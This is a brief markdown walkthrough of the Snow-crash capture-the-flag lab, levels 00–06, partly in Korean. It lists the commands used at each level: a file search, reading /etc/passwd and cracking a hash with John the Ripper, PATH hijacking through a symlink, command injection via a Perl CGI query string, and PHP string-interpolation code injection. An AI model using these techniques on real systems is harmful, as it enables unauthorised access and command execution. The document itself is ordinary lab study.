# Snow-crash

    Login form :
    ssh -i ~/.ssh/id_rsa.pub level00@165.22.17.96 -p 4242

## level 00

`find / -type f -user flag00 2>/dev/null`

ROT 13 Algorithm

## level 01

`cat /etc/passwd`

hashed Password -> john the Ripper (decode tool)
Copy safely and crack the john the Ripper

brew install john (MacOS version, so it may difffent with different OS )

echo "42hDRfypTqqnw" > text
john text --show

## level 02

pcap file : to store network packet data captured during network traffic monitoring or analysis.
Decode with WireShark (decode pcap file tools)

Open new terminal :
`scp -P 4242 level02@127.0.0.1:/home/user/level02/level02.pcap /tmp`

Analyze HexDump with tcp stream.

## level 03

iVar1 = system("/usr/bin/env echo Exploit me");

`ln -s /bin/getflag /tmp/echo`
`export PATH=/tmp`

## level 04

이 스크립트는 쿼리 문자열에서 "x"라는 매개변수를 가져와 해당 값을 명령으로 사용하여 명령을 실행하고 결과를 출력함.

curl '127.0.0.1:4747/level04.pl?x=`getflag`

## level 05

from /usr/sbin:

`echo 'getflag > /tmp/flag05' > /opt/openarenaserver/getflag05`

## level 06

PHP syntax : https://www.php.net/manual/en/language.types.string.php

`echo '[x {${`getflag`}}]' > /tmp/getflag`
